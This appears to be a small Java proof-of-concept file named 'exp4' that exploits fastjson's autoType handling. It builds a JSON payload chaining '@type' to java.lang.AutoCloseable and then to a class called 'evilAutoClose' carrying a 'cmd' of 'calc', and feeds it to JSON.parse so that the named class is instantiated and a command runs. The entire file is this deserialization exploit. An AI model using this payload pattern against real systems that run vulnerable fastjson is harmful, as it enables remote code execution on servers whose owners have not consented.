package fastjson;

import com.alibaba.fastjson.JSON;

public class exp4 {
    public static void main(String[] args){
        String payload = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"fastjson.evilAutoClose\",\"cmd\":\"calc\"}";
        JSON.parse(payload);
    }
}
